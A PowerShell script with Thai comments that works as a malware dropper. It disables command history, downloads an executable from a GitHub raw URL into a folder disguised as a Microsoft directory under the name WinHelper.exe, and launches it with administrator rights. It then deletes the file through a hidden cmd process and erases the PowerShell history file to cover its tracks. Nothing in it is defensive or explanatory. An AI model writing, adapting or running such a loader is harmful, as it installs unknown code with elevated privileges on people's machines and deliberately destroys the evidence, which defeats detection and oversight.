# 1. จัดการเรื่องประวัติ (เน้นความเงียบ)
try { Set-PSReadlineOption -HistorySaveStyle SaveNothing } catch {}
$ErrorActionPreference = 'SilentlyContinue'

# 2. ตั้งค่าที่อยู่โฟลเดอร์เป้าหมาย
$workDir = "$env:LOCALAPPDATA\Microsoft\CLR_v4.0"
if (-not (Test-Path $workDir)) { 
    New-Item -Path $workDir -ItemType Directory -Force | Out-Null 
}
$output = Join-Path $workDir "WinHelper.exe"
$url = "https://github.com/relaxwtf777-lang/cmd/raw/refs/heads/main/BASX.exe"

# 3. ล้างไฟล์เก่าออกก่อนและดาวน์โหลดใหม่
if (Test-Path $output) { Remove-Item $output -Force }
try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($url, $output)
} catch {
    Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing
}

# 4. ตรวจสอบไฟล์แล้วสั่งรันระบบแบบสิทธิ์ Admin
if (Test-Path $output) {
    try {
        $sh = New-Object -ComObject Shell.Application
        $sh.ShellExecute($output, "", "", "runas", 1)
        Start-Sleep -Seconds 3
    } catch {
        Start-Process -FilePath $output -Verb RunAs
    }
}

# 5. เปิดระบบบันทึกประวัติกลับมา และสั่ง CMD เก็บกวาดเบื้องหลัง (รอ 15 วินาทีแล้วลบไฟล์ EXE)
try { Set-PSReadlineOption -HistorySaveStyle SaveIncrementally } catch {}
try {
    $cleanCmd = "timeout /t 15 && del /f /q `"$output`""
    Start-Process cmd -ArgumentList "/c $cleanCmd" -WindowStyle Hidden
} catch {}

# 6. รันคำสั่งลบประวัติใน PowerShell ทันทีก่อนปิดตัว
try {
    Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
} catch {}

exit
